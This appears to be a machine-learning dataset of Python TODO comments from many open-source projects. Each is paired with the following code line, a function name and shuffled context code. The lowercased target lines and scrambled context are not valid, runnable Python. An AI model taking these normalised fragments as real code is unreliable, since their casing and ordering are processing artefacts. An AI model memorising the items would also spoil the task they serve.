# todo: is this recalculation really necessary? (see below as well) </s> trterm = np.sum(np.sum(	dhdx_local dVdy = dVdy[np.triu(np.ones((N,N))).astype(bool)] dMM = dMdy.dot(dMdy.T) np.multiply(ddlogPdMdM, np.reshape(dMM, (1,dMM.shape[0],dMM.shape[1]))), 2), 1)
# todo(vek): need to pass context in for access to auth_token </s> pass	reset_network def reset_network(self, instance):
# todo: move to base class </s> return self._manipulationmode	Canvas @property def manipulationMode(self): @manipulationMode.setter def manipulationMode(self, value):
self.parent().hide() # todo: make configurable </s> self.parent().mainwindow().currentview().setfocus()	slotEscapePressed def slotEscapePressed(self):
# todo placeholder; implement </s> pass	init_app backend_options: torch_rpc.RpcBackendOptions, ):
# steps = 0 # todo </s> print("dupli export took %.3fs" % (time() - start))	create_session transformations = array("f", duplis.matrices) luxcore_scene.DuplicateObject(src_name, dst_name, count, transformations) engine.update_progress(index / len_objs) if engine.test_break():
# # todo: mrcc energy is way off expected </s> import pyscf.cc	test_iter_d def test_iter_d(self): e2, t2 = cc.kernel_ground_state_d(self.ccsd) cc1 = scf.RHF(self.mol).run(conv_tol = 1e-11).apply(pyscf.cc.CCSD) cc1.frozen = 1
# todo do something with temp </s> self.trans_distn.resample([s.stateseq for s in self.states_list])	resample_trans_distn def resample_trans_distn(self,temp=None): self._clear_caches()
if not file_name:  # todo: file completion </s> window.run_command('show_overlay', {	window_tab_control (group_index, view_index) = window.get_view_index(view) if command == 'open': 'overlay': 'goto', 'show_files': True,
# todo (#567): bucket the node as suspicious </s> return response(message, status=httpstatus.unauthorized)  # 401 - unauthorized	reencrypt message = f'{bob_identity_message} Invalid signature for KeyFrag: {e}.' log.info(message) except Exception as e: message = f'{bob_identity_message} Invalid KeyFrag: {e}.'
# todo: error checking </s> json_obj = json.loads(content)	list_boards headers = headers, ) return json_obj.boards
# todo: should we enable auto-retry, </s> producer.publish(msg, exchange=exchange)	do_publish elif exchange is not None: maybe_declare(exchange, channel)
# todo: handle if there is a selection </s> send(vt100_right)	MicroPythonREPLPane super().keyPressEvent(data) else: elif key == Qt.Key_Left: if shift_down:
else: self.assertequal(end, 1) # todo: simple exec should not wait_testpid!! </s> top = _recent(output(_top_list))	test_3901_start_false_exec_simple logg.info(" %s =>%s\n%s\n%s", cmd, end, out, i2(err)) if real: self.assertEqual(end, 0) logg.info("\n>>>\n%s", top) self.assertFalse(greps(top, testsleep))
# todo: make this status more clear </s> item.status_code = 400	FetchThread conn = e except urllib2.URLError, e: return item try:
# todo: add run on all columns functionality </s> line_index = 0	csv_file_to_indicator_list def csv_file_to_indicator_list(file_path, col_num, starting_row, auto_detect, default_type, type_col): indicator_list = [] with open(file_path) as csv_file: file_reader = csv.reader(csv_file)
# todo: handle other hosts </s> raise notimplementederror	get_ipv4_addresses return addr_list else:
logger.warn('zzz')  # todo: buffer .. </s> else:	read_ipc if o_client.origin == data[0]: if not o_lock.acquire(False): o_pipe.send((event, (client.origin, data[1]))) o_lock.release()
# todo ??? other type of cases </s> def test_set_and_load_version(tmpdir):	test_set_and_load_version version_file = str(tmpdir.join("version.txt")) for version in [
# todo: error handling like numba callwrappers.py </s> native_val = unbox_array(types.array(dtype=dtype, ndim=1, layout='c'), arr_obj, c)	lower_unbox_df_column arr_obj = c.pyapi.object_getattr_string(args[0], "values") dtype = sig.args[2].dtype return native_val.value
# todo(john-wood-w) allow until plugin validation is added. </s> self.unsupported_req = {	test_should_allow_add_new_order_unsupported_algorithm def test_should_allow_add_new_order_unsupported_algorithm(self): 'secret': { 'name': self.secret_name,
# todo, can we avoid the copy? </s> with self._ybc.dat.vec as v:	multTranspose if self.on_diag: if len(self.col_bcs) > 0: Y.copy(v) for bc in self.col_bcs:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	unpause def unpause(self, instance, callback):
# todo: implement </s> if self.turn == white:	pop def pop(self): move = self.move_stack.pop() self.ply -= 1 self.half_moves = self.half_move_stack.pop()
# todo(jk0): this will eventually need to take ssl into consideration </s> return "http://%s:%d/%s/images/%s" % (flags.glance_host,	generate_alternate def generate_alternate(self, image_id): FLAGS.glance_port, self.project_id, str(image_id))
# todo: use sqlalchemy to build this query! </s> sql = "select r.id, r.ease, r.cid, r.usn, r.ivl, r.lastivl, r.factor, r.time, r.type from revlog as r"	CollectionHandler return result def latest_revlog(self, col, req): args = [] if req.data.has_key('updated_since'):
# todo: setup/teardown must be methods of a class so we can reuse them </s> source = source.from_file(filename_or_fobj, plugin_name="ods")	sheet_names def sheet_names(filename_or_fobj): ods_file = zipfile.ZipFile(source.fobj) content_fobj = ods_file.open("content.xml")
# todo(dcramer): re-enable test when find_green_parent_sha is turned </s> data = self.unserialize(resp)	test_with_full_params }) assert resp.status_code == 200, resp.data assert len(data) == 1 assert data[0]['id']
# todo: reenable in the features branch </s> return getattr(pytest, self.name)	__get__ if obj is None: return self
# todo add docstring </s> if query_type == 'erg_levels':	select_data def select_data(self, data, i, query_type): num_erg_levels = int(data[i + 1]) col_names = [s.strip() for s in data[i + 2][1:].split('+')]
# todo update this code once keras > 2.0.4 is released </s> try:	validate time.sleep(10) continue embedding = keras.models.load_model( weights_h5, custom_objects=CUSTOM_OBJECTS,
# todo results from p0f </s> return	_get_prev_ipv6_oses @staticmethod def _get_prev_ipv6_oses(endpoint):
# todo(iceboy): rate limit base on ip. </s> pdoc = await problem.get(self.domain_id, pid)	ProblemSubmitHandler @base.sanitize async def post(self, *, pid: document.convert_doc_id, lang: str, code: str): if pdoc.get('hidden', False): self.check_perm(builtin.PERM_VIEW_PROBLEM_HIDDEN)
# todo: change logging </s> pass	setxattr self.remove_tree(*pickle.loads(value)) elif name == 'logging': elif name == 'stacktrace': log_stacktraces()
# todo this requires fleshing out some more.. </s> field = string(name='name', required=true)	test_string_input def test_string_input(): result = field.marshal({'name': 'foo', 'email': 'mike@mike.com'}) assert result == 'foo'
# todo append masters as named-instances as well; needs .designspace change. </s> fvar = _add_fvar(vf, ds.axes, ds.instances)	build master_ttfs.append(None)  # in-memory fonts have no path vf = deepcopy(master_fonts[ds.base_idx]) if 'STAT' not in exclude: _add_stat(vf, ds.axes)
# todo(laigd): remove this check when 313682500 is in the release. </s> if use_tf_function and tf.compat.v1.__version__ < '2.3.0':	testListInput ) def testListInput(self, use_tf_function): return FLAGS.if_use_tf_function = use_tf_function
# @todo - link changes with colud </s> @property	Spreadsheet def id(self): return self._id def title(self): return self._title
#time = "todo" </s> try:	fill_annotation annot.annotation_metadata.annotator.name = "TODO" annot.annotation_metadata.annotator.email = "TODO" #TODO f = open(lab_file, "r") except IOError:
# todo: fix self.cursor_x >= w </s> if self.cursor_x == 0:	main_k_home def main_k_home(self, h, w): line = self.output.lines[self.win_y + self.cursor_y] while self.cursor_x < len(line):
# todo may want to pass iv and dv instead of expr (especially since iv/dv may not be variables) </s> res_data = execute_test(dataset, expr, data_props, design) # design contains info about between/within subjects and power parameters (alpha, effect size, sample size - which can be calculated)	evaluate data_props = compute_data_properties(dataset, iv, dv, expr.predictions) import pdb; pdb.set_trace() return res_data elif isinstance(expr, Mean):
# todo: use is_accessible once two layer trie is implemented </s> if keccak(address) + code_trie_prefix not in self.read_list:	account_is_empty def account_is_empty(self, address): if self.is_access_restricted: raise UnannouncedStateAccess( "Attempted reading code of account outside of read list"
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# tracks a suggested todo, which will reduce the 3 rpc calls here to only </s> translator = contracttranslator(registry_abi)	get_token_added_events def get_token_added_events(self, from_block, to_block=''): filter_ = self.raiden.registries[0].tokenadded_filter(from_block, to_block) events = filter_.getall()
# todo: fix with stubber / before send event </s> with mock.patch('botocore.endpoint.endpoint._send') as _send:	test_get_export 'accepts': 'application/yaml' } _send.return_value = mock.Mock( status_code=200, headers={}, content=b'{}')
#todo: this should never happen, dep on equiv </s> display_message(e.json_error_response(), type='error', duration=3)	delete_arc mods.deletion(eq_ann) except DependingAnnotationDeleteError, e: return {} if DEBUG:
# todo - add hubbub package when available. </s> pass	package_info self.cpp_info.components["_libwebsockets"].requires.append("wolfssl::wolfssl") if self.options.with_hubbub:
# todo use display_message and add_messages_to_json </s> print dumps(	serve print 'Content-Type: application/json\n' error_msg = 'Error: file not found' { 'error': error_msg,
# todo refactor and remove </s> return batch, tensor.clone().detach().view(batch, -1)	batch_flat batch = tensor.size(0)
pass # todo </s> def _playlistid(self, songid=none):	_playlistid @register(r'^playlistid( (?P<songid>\S+))*$')
# todo(ytknzw): add more specific assertion with the test case. </s> study_categorical_params = create_study()	test_plot_parallel_coordinate figure = plot_parallel_coordinate(study) assert figure.has_data() is False study_categorical_params.add_trial( create_trial(
#@todo: remove in 0.4.10 </s> if reason:	temp_offline def temp_offline(self, reason=""): Fail and indicates file ist temporary offline, the core may take consequences self.pyfile.error = encode(reason) raise Fail("temp. offline")
# todo: timeline is global, get rid of it </s> posts = [x for x in self.site.timeline if x.use_in_feeds]	gen_tasks } template_name = "index.tmpl" lists = [] while posts:
# todo: sort the functionality by name and by vuln class </s> for vuln_name in vulns:	set_vuln_tree self.vuln_tree = DefaultMutableTreeNode("Vulnerability Classes") vulns = self.issues["issues"] vuln = DefaultMutableTreeNode(vuln_name) self.vuln_tree.add(vuln)
# todo(#6071): our executeprocessrequest expects a specific string type for arguments, </s> argv = [text_type(arg) for arg in cmd]	_execute_hermetic_compile for f in input_snapshot.files if f.endswith('.java') ) exec_process_request = ExecuteProcessRequest( argv=tuple(argv),
# todo tmp return, to unify with monitor auto-fetch later </s> loss, explore_var = self.agent_space.update(	run_episode logger.debug( f'reward_space: {reward_space}, state_space: {state_space}, done_space: {done_space}') action_space, reward_space, state_space, done_space) episode_data_list.append(
1  # todo: fill in identifier </s> )	test_settlement_with_unauthorized_token_transfer direct_transfer0 = channel0.create_directtransfer( transfer_amount0, direct_transfer0.sign(privatekey0, address0) transfer_amount1 = 30
# todo: numba or cython to improve performance of this kernel </s> def der_local_values_notcentered_kernel(log_vals, log_val_p, mels, der_log_p, out):	der_local_values_notcentered_kernel for k in range(len(mels)): out[k, :] = ((mels[k] * _np.exp(log_val_p[k] - log_vals[k]))[:, _np.newaxis] * der_log_p[k]).sum(axis=0)
# todo(necula): produces mismatched outputs on gpu. </s> jax2tflimitation("mismatched outputs on gpu",	igamma tst.assertAllClose(result_jax[~special_cases], result_tf[~special_cases]) return [ devices=("gpu",), skip_comparison=True), missing_tf_kernel(
# todo add shape check </s> raise notimplementederror	_sqrt_hessian def _sqrt_hessian(self, module, g_inp, g_out):
# todo(crcrpar): annotate this correctly. </s> @functools.wraps(func)	new_func def new_func(*args: Any, **kwargs: Any) -> Any: warnings.simplefilter('always', UserWarning)
# todo: look at args for remotedata </s> workers = frequencies(w for dep in deps	add_key_to_queue deps = dependencies[key] yield [completed[dep].wait() for dep in deps]  # wait until dependencies finish for w in who_has[dep]) worker = min(workers, key=lambda w: len(stacks[w]))
# todo: remove once typeshed supports literal types </s> assert isinstance(ov, _winapi.overlapped)	__enter__ try: ov = _winapi.ConnectNamedPipe(self.connection, overlapped=True) except WindowsError as e: if e.winerror not in (_winapi.ERROR_PIPE_CONNECTED, _winapi.ERROR_NO_DATA):
# todo switch to transform </s> transform = self.affine	window_transform def window_transform(self, window): return window_transform(transform, window)
# todo test </s> def network(network):	network tpm(network.tpm) connectivity_matrix(network)
logg.error("too long") #todo </s> self.end(266)	test_5237_bad_usermode_notify_service_functions_with_reload_user self.rm_testdir() self.coverage()
# todo: unittest before committing </s> raise valueerror, "failed to load a dataset from %s.  " \	from_hdf5 res = hdf2obj(hdf) if not isinstance(res, AttrDataset): "Loaded %s instead." \ % (source, type(res))
# todo: remove this compatibility layer with rally 1.1.1 </s> idx = self.index_name()	store_results def store_results(self, race): self.client.put_template("rally-results", self.index_template_provider.results_template()) if self.client.exists(idx): index_info = self.client.get_index(idx)
raise exceptions.mpdnotimplemented  # todo </s> directory.	save Saves the current playlist to ``NAME.m3u`` in the playlist
# todo: does updating sigma here (as opposed to after regret) miss out </s> vo = 0.0	cfrp I = state.info_set calculate_strategy(regret, sigma, I, state) voa = {} explored = {}  # keeps tracked of items that can be skipped
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
# todo check default function methods and return them </s> result = []	follow_path else: if isinstance(input, parsing.Function): else: if isinstance(input, Instance):
pass # todo </s> def test_datetimefield():	test_DateTimeField
# todo not implemented yet </s> return	move_current_view_to_far_right Currently only supports 2 row or 2 column layouts. if self.window.num_groups() > 2: if self.window.num_groups() < 2: return
# todo: report </s> msg = self.__msg.create_response(rfc3261.ok)	__handle_invite ) media_ports[name] = self._rtp_streams[name].local.port
# todo: deprecate `pages` in favor of `page_limit` since it is less confusing </s> if 'pages' in kwargs:	get_posts_by_search ) kwargs.pop('sleep') kwargs['page_limit'] = kwargs.pop('pages') if "reactions" not in options:
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_fail_inputs_wrong_type def test_fail_inputs_wrong_type(self): ``inputs`` is not an array.
# todo: wrap backend call in error handling. </s> backend.playback.prepare_change()	_change if not backend: return False try: if not backend.playback.change_track(pending_tl_track.track).get():
# todo: replace with stream-changed </s> self._trigger_track_playback_started()	play if success: self.core.tracklist.mark_playing(tl_track) else: self.core.tracklist.mark_unplayable(tl_track)
# todo: unescape values </s> return [	sheet_names tables = xpath(spreadsheet, "//table:table", namespaces) name_attribute = f"{{{namespaces['table']}}}name" table.attrib[name_attribute] for table in tables
'''todo: add docs''' </s> def __init__(self, df):	AppModel class AppModel(object): self.df = df self.data = ColumnDataSource(df)
# todo: implement </s> pass	hyphenate found.append((tokeniter.cursor(block, token, m.start(), m.end()), m.group())) if not found: if found: import hyphenator
# todo: currently can't initialize hadooprunner without setting these </s> runner = hadoopjobrunner(	test_pass_through_fields def test_pass_through_fields(self): hadoop_bin='hadoooooooooop', hadoop_home='kansas',
# todo: if the main thread receives a signal and we have no timeout, we </s> io_events = poller.poll(timeout)	WaitForSocketCondition try: while True: if not io_events: return None
# todo - molecule type - see issue 363 / pull request #1005 </s> d = consumer.data.annotations.get('data_file_division', none)	test_first_line_imgt self.assertEqual(t, topo, "Wrong topology %r not %r from %r" % (t, topo, line)) self.assertEqual(d, div, "Wrong division %r not %r from %r" % (d, div, line))
# todo(ahundt) softmax is pre-applied, so need different train, inference, evaluate. </s> return densenet.densenet(depth=none, nb_dense_block=3, growth_rate=32,	Atrous_DenseNet include_top=False): if include_top is True: nb_filter=-1, nb_layers_per_block=[6, 12, 24, 16], bottleneck=True, reduction=0.5, dropout_rate=0.2,
# todo: add this back in once we've merged back the refactored users code </s> self.assertequals(users_count, 1)	testStealCommCareUser users_count = CouchUser.view("users/by_commcare_username_domain", key=[self.domain, self.commcare_username]).total_rows
# todo: move this to a common test module (tests/common.py?) </s> def popen_python(command_arg_list):	popen_python Run subprocess.Popen() to produce a process running a Python interpreter. Uses the same Python interpreter that the current process is using, via
# todo pydocs </s> return self._buffersize if self.buffersize else 1	get_arraysize def get_arraysize(self):
# todo: perhaps something more self-documenting for variables names? </s> a = 133	test_orders ) sim = Simulator(addresses) b = [10.0] * 16 c = [100] * 16
# todo: add tcp-like buffering </s> pass	DatagramPort raise error.MessageLengthError, "message too long" elif no == EAGAIN: else: raise
# todo: if py3k, override unpickler.find_class(). </s> pass	_load mypickle.find_global = None except AttributeError: self._cache_data = mypickle.load() f.close()
def __init__(self, p_args, p_todolist, #pragma: no branch </s> p_out=lambda a: none,	__init__ p_err=lambda a: None, p_prompt=lambda a: None):
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
# todo: update graph references </s> elif isinstance(src, list):	MetaCollection self.name = src.name  #? See Collection: How to treat names in case of a copy? self.store = deepcopy(src.store) for item in src: if isinstance(item, Collection):
# todo we need to work on the unit from the exposure. </s> exposure = self.exposure.keywords['exposure']	style classification = definition(classification) thresholds = self.hazard.keywords.get('thresholds') unit = definition(exposure)['units'][0] enable_rounding = not self.debug_mode
# todo: sync with link.smart_link() to choose a linker </s> linkers = { 'cxx': ['aixc++'], 'cc': ['aixcc'] }	exists def exists(env): alltools = [] for langvar, linktools in linkers.items():
# todo: support speedy mode for running the script </s> shell("make scriptconfig script=kconfiglib/examples/allnoconfig_simpler.py")	test_all_no_simpler 'make scriptconfig' and needs to reparse the configurations, so kinda slow even in speedy mode.""" shell("mv .config ._config") if speedy_mode:
# todo: check </s> self.projection_matrices = nn.embedding(num_relations, self.entity_embedding_dim * self.relation_embedding_dim)	__init__ self.entities_embeddings = nn.Embedding(num_entities, self.entity_embedding_dim) self.relation_embeddings = nn.Embedding(num_relations, self.entity_embedding_dim) self.margin_loss = margin_loss
# todo(huanxuan): remove this if condition once the fixed </s> if not hasattr(_quota.quota, 'allow_get'):	test_quota_set_network ] parsed_args = self.check_parser(self.cmd, arglist, verifylist) result = self.cmd.take_action(parsed_args) kwargs = {
# todo: edge dps could use a different forwarding algorithm </s> host_learned_other_dp = none	rcv_packet learn_port = port else: for other_dpid, other_valve in valves.iteritems(): if other_dpid == dp_id:
# todo add method if no aws creds </s> read_acl_perm_allowed = true	check_perm_read_acl if not self.aws_creds_configured: raise NotImplementedError("check_perm_list_bucket not implemented for no aws creds") try: self.s3_client.get_bucket_acl(Bucket=bucket.name)
# todo: check output </s> output = run_model(prob)	test_feature_set_solver_print2 prob.setup(check=False)
# todo(nakago): check why tolerance is high </s> @pytest.mark.gpu	test_backward_gpu def test_backward_gpu(model, data): atom_data, adj_data, y_grad = [cuda.to_gpu(d) for d in data]
# todo: conflict detection/resolution </s> for key in d:	analyzer if not d: return self._analysis.setdefault(key, {}).update(d[key])
# todo: cannot be loaded with plugins; improve this solution </s> pd = helpers.import_from_plugin("pandas", plugin="pandas")	create_dialect def create_dialect(self, resource, *, descriptor): try: if resource.format == "pandas" or isinstance(resource.source, pd.DataFrame): return PandasDialect(descriptor)
# todo: deprecated - remove in version 0.10 </s> if isinstance(training_trackers, string_types):	train_online "When using online learning, you need to specify " "an interpreter for the agent to use.") logger.warn("Passing a file name to `agent.train_online(...)` is " "deprecated. Rather load the data with "
# todo: handle marker? </s> for alias in aliases.get('aliases'):	_find_alias else: aliases = conn.list_aliases(FunctionName=functionname) if alias['Name'] == name: return alias
#todo : manage more than just quit </s> def manage_signal(self, sig, frame):	Broker self.have_plugins = False self.plugins = [] print "\nExiting with signal", sig self.daemon.shutdown(True)
# todo: come up with a proper detect() routine...and enable it. </s> return 1	exists def exists(env):
# todo: we need to insert a linebreak here, but there is no </s> text = "\n" + text	insert_with_tags_by_name def insert_with_tags_by_name(buffer, line, text, tag): if line >= buffer.get_line_count(): buffer.insert_with_tags_by_name(get_iter_at_line_or_eof(buffer, line), text, tag)
# todo: support preferences file in backup under linux (is in different directory). </s> curaapplication.getinstance().savesettings()	makeFromCurrent version_data_dir = Resources.getDataStoragePath() Logger.log("d", "Creating backup for Cura %s, using folder %s", cura_release, version_data_dir) buffer = io.BytesIO() archive = self._makeArchive(buffer, version_data_dir)
# todo: not sure if this is pg only or standard </s> "alter table t alter column c set not null"	test_alter_column_not_nullable op.alter_column("t", "c", nullable=False) context.assert_(
# todo crossplataform?: </s> filepath_remote = os.path.join(path,	run_blender_in_thread except ssh_exception.SSHException: print ("Error uploading via SCP, SSHException") str(options['job_id'])) with SCPClient(ssh.get_transport()) as scp:
# todo setup mahout, must be checked out from repo atm: </s> pass	install_mahout def install_mahout(env):
# todo: "annotator" is a very confusing term for a web service </s> tool_list = get_annotator_config_list(self.directory)	get_annotator_config def get_annotator_config(self): return self._get_tool_config(tool_list)
# todo(amaranth-0.4): remove </s> if ports is none:	convert def convert(elaboratable, name="top", platform=None, ports=None, *, emit_src=True, strip_internal_attrs=False, **kwargs): warnings.warn("Implicit port determination is deprecated, specify ports explictly", DeprecationWarning, stacklevel=2)
# todo: temporary thing (there is no uia based wrappers tree yet) </s> from .elementwrapper import elementwrapper	FindWrapperUIA wrapper = _MetaWrapper.control_types[elementinfo.controlType] else: wrapper = ElementWrapper return wrapper
# todo: avoid flush all caches </s> pwndbg.memoize.reset()	clear_custom_page while custom_pages: custom_pages.pop()
# todo(toshihikoyanase): remove the constraints when tensorflow==2.7.0 is released. </s> "tensorflow-estimator<2.7.0",	get_extras_require "scikit-optimize", "xgboost", "tensorflow<2.7.0", "tensorflow-datasets",
# todo: implement persistence for configuredname </s> tv_service.configure_char('configuredname', value=self.name)	__init__ ) tv_service.configure_char('Name', value=self.NAME) tv_service.configure_char('SleepDiscoveryMode', value=1) for idx, (source_name, source_type) in enumerate(self.SOURCES.items()):
# todo: should not assume presence of any kind of parameter </s> output['bucket'] = param['container'] # todo: replace with global config of some sort	write_dataset_to_storage if 'container' not in param: raise DatacubeException('Missing `container` parameter, cannot write to storage.') self.storage.filepath = output['bucket']  # For the s3_test driver only output['base_name'] = '%s_%s' % (filename.stem, band)
# todo: include a validation step for x </s> _x = reduce(iconcat, x, [])	fit_transform only if the size of the intersection between the two sets is no less than `min_intersection`. _X = [(node_info[0], *node_info[1]) for node_info in zip(range(len(_X)), _X)]
# todo(nmakhotkin): simplify calculating task output. </s> e_data = raw_result.error	_determine_task_output out_key = (task_spec.get_publish().keys()[0] if task_spec.get_publish() else None) output = expr.evaluate_recursively( task_spec.get_publish(),
return  # todo return placeholder "[loading]" album? </s> if sp_album.artist is none or not sp_album.artist.is_loaded:	to_album_ref def to_album_ref(sp_album): if not sp_album.is_loaded: name = sp_album.name else:
# todo: try to figure out the right lexer for these files </s> markup_a = self._apply_pygments(old or '', source_file)	generate_chunks self.normalize_path_for_display(self.modified_filename) try: markup_b = self._apply_pygments(new or '', dest_file) except:
# todo: rebalance if output distributions are 1d instead of 1d_var </s> loc = join_node.loc	join_distributed_run def join_distributed_run(join_node, typemap, calltypes, typingctx): def f(t1_key, t2_key): (t1_send_counts, t1_recv_counts, t1_send_disp, t1_recv_disp,
# todo: this comparison should happens only if users </s> raise failureprotocolerror()	check_protocol if reason and protocol: if isinstance(protocol, EnumMeta) and not isinstance(reason, Enum): if reason not in protocol: raise FailureProtocolError()
# todo: run filters here. </s> print("<", data)	_proxy_in_request data = self.libusb_device.ctrl_transfer(req.request_type, req.request, req.value, req.index, req.length) self.send_control_message(data)
# todo integrate into keypoints </s> def normalize_shape(shape):	normalize_shape Normalize a shape tuple or array to a shape tuple. Parameters
self.assertequals(status, 200) # todo: should be 202 </s> status, body = self.post(path, body)	_test_update options=options,)
# todo: parse human-friendly logmaxsize ... e.g. 10mb </s> self.logmaxsize = config.getint('general','logmaxsize')	log_mediator else: try: self.logbackups = config.getint('general','logbackups') self.logcompress = config.getboolean('general', 'logcompress')
# todo make atomic </s> graph = tx.graph	Cog graph.delete(self.subject_node) def __db_merge__(self, tx, primary_label=None, primary_key=None): remote_node = remote(self.subject_node) if not remote_node:
# todo: deprecate </s> code = self.create_authorization_code(	create_authorization_response self.request.user = grant_user if hasattr(self, 'create_authorization_code'): self.request.client, grant_user, self.request) else:
# todo(b/186451541): reduce the number of calls to model_fn. </s> self.assertequal(mock_model_fn.call_count, 4)	test_construction_calls_model_fn federated_averaging.build_federated_averaging_process( model_fn=mock_model_fn, client_optimizer_fn=tf.keras.optimizers.SGD)
# todo transition this once pushy is out </s> rconn = connection(hostname, logger, sudo=true)	create hostname = remote_shortname(distro.sudo_conn.modules.socket) common.mon_create(distro, logger, args, monitor_keyring, hostname) if distro.init == 'upstart':  # Ubuntu uses upstart process.run(
# todo remove in next major version 5.0.0 see serializers.reservedfieldnamesmixin </s> with pytest.deprecated_call():	test_patch_allow_field_type def test_patch_allow_field_type(author, author_type_factory, client): Verify that type field may be updated. author_type = author_type_factory() url = reverse("author-detail", args=[author.id])
#todo - complete implementation of these apis </s> return faults.fault(faults.portnotfound(e))	get_resource except exception.PortNotFound as e:
# todo: enable admin tests </s> if all:	test test_osf(ctx) test_api(ctx) test_addons(ctx) karma(ctx, single=True, browsers='PhantomJS')
# todo: use get_cstr_and_len instead of getitem </s> str = str_arr[i]	str_arr_bool_impl for i in range(n): if bool_arr[i] == True: n_strs += 1 n_chars += len(str)
# todo: refactor this to avoid additional lookup in cast_params </s> action_ref = self.rule.action['ref']	enforce def enforce(self): action_db = action_db_util.get_action_by_ref(action_ref) if not action_db:
# todo: will need some code for the tabs active terms to work </s> pass	on_focus_in term = None if self.is_child_notebook(): else: if isinstance(self.last_active_term, uuid.UUID):
# todo(albert): implement stub. </s> pass	deserialize RETURNS: JSON as a plain-old-Python-object.
# todo: assert </s> repo = self.remote.get_repo("testrepo0")	test_get_repo Test: Get a repo object
# todo: use different flag than .reentrant </s> pos_array = [colorsorter._transform_point(a(pos)) for pos in pos_array]	schedule_polycone_multicolor parameter if ColorSorter._parent_csdl and ColorSorter._parent_csdl.reentrant: if drawing_globals.use_c_renderer and ColorSorter.sorting: if len(color) == 3:
# fixme todo replace with proper url section joining taking unicode inputs </s> mytest.url = base_url + \	parse_test assert isinstance(configvalue, basestring) or isinstance( configvalue, int) unicode(configvalue, 'UTF-8').encode('ascii', 'ignore') elif configelement == u'extract_binds':
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo add shape check </s> raise notimplementederror	_jac_t_mat_prod def _jac_t_mat_prod(self, module, g_inp, g_out, mat):
#todo: not integrated with cbar yet... </s> check_offt(self)	get_axes :func:`pyNastran.bdf.cards.elements.bars._rotate_v_wa_wb` for a description of the OFFT flag. is_failed = True ihat = None
# todo: handle non numpy alloc types </s> col_name_args = ', '.join(["c"+str(i) for i in range(len(col_names))])	_handle_df_apply col_names = self.df_vars[func_mod.name].keys() Row = namedtuple(func_mod.name, col_names) row_args = ', '.join(["c"+str(i)+"[i]" for i in range(len(col_names))]) func_text = "def f({}):\n".format(col_name_args)
# todo: make previous blocking instead of sleep </s> time.sleep(0.1)	wrapper while all(key in elements[scoop.worker] for key in kwargs.keys()) is not True: _control.execQueue.socket.pumpInfoSocket() elementNames = list(itertools.chain(*(elem.keys() for elem in elements.values()))) if len(elementNames) != len(set(elementNames)):
# todo: cat, slice, array, clocksignal, resetsignal, memory </s> raise notimplementederror	execute self.modifications[s.l] = value else: elif isinstance(s, If): if self._eval(s.cond):
# todo: find out how to get global usernames </s> def unfollow(mastodon, rest):	unfollow @command
#todo the tolerance needed to pass is very high for float32(0.16). is this acceptable? expected? </s> return out	testf unroll_kern=un_k)
# todo: is there a better way to check this? </s> return isinstance(val, int)	isint def isint(val):
# todo -- we might need to expanduser taking .user into account </s> out = createsibling._run_on_ds_ssh_remote(	_has_active_postupdate has_active_post_update = None try: ds, name, ssh, 'cd {path} && [ -x .git/hooks/post-update ] && echo yes || echo no'
# todo. percentile </s> distances = self.pdist(fx)	fit fX_ = fX.data.numpy() norm_avg += np.mean(np.linalg.norm(fX_, axis=0)) if gpu: distances_ = distances.data.cpu().numpy()
# todo: add .data and .grad to syft tensors </s> for p in nn_self.parameters():	module_share_ def module_share_(nn_self, *args, **kwargs): p.share_(*args, **kwargs) return nn_self
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_regular_command def test_regular_command(self): Sending a non-sandbox command to the node.
# todo: only handle it if the trigger refers to the current sensor </s> trigger = self._sanitize_trigger(trigger=trigger)	_handle_create_trigger def _handle_create_trigger(self, trigger): self._sensor_instance.add_trigger(trigger=trigger) pass
name='unknown',  # todo currently not storing requester </s> summary='pp:55 pq:55 pr:55',	test_create_fulfill_and_receive_requisition ), const.notification_template(req.get_next_action().action).format( loc=self.sp.location.site_code, keyword=req.get_next_action().keyword
# todo: let's see if we can find sane versioning for `latest` from upstream </s> if image_config['tag'] == 'latest':	ChartReleaseService image_config = release_data['config'].get('image') or {} if all(k in image_config for k in ('tag', 'repository')): app_version = f'{image_config["repository"]}_{image_config["tag"]}' else:
pass # todo </s> def handle_request(self, input):	handle_request
# todo: index arg? </s> func_text += "  arr = hpat.pio_api.h5_read_dummy(dset, {}, '{}')\n".format(tp.ndim, dtype_str)	handle_possible_h5_read dtype_str = str(tp.dtype) func_text = "def _h5_read_impl(dset, index):\n" loc_vars = {} exec(func_text, {}, loc_vars)
# todo subject.cn from cert? </s> if cleanup:	test_simple_apptgz self.call_iresign(input_path=TEST_APPTGZ, output_path=app_path) assert exists(app_path) os.remove(app_path)
#todo only apply this filter if set by the user </s> if sum(sum(x) >= 1 for x in gts if not none in x) > args.max_hets: continue	main gts = [s.get("GT", (None, None)) for s in variant.samples.values()] if sum(None in g for g in gts) >= args.min_call_rate * len(vcf_samples): continue if not any(sum(x) > 0 for x in gts if not None in x): continue test_idxs = [i for i, gt in enumerate(gts) if not None in gt and sum(gt) > 0]
# todo: remove in v.0.6 </s> msg = ("rca will no longer center the data before training. if you want "	test_changedbehaviorwarning_preprocessing def test_changedbehaviorwarning_preprocessing(self): "to do some preprocessing, you should do it manually (you can also " "use an `sklearn.pipeline.Pipeline` for instance). This warning "
# todo: create xxx_failure test </s> p = op.join(app.config['root'], 'tests/fixtures/ttf/font-bold.ttf')	test_result_METADATA_postScriptName_canonical_success def test_result_METADATA_postScriptName_canonical_success(self): r = run_set(p, 'result') success_tests = r['success']
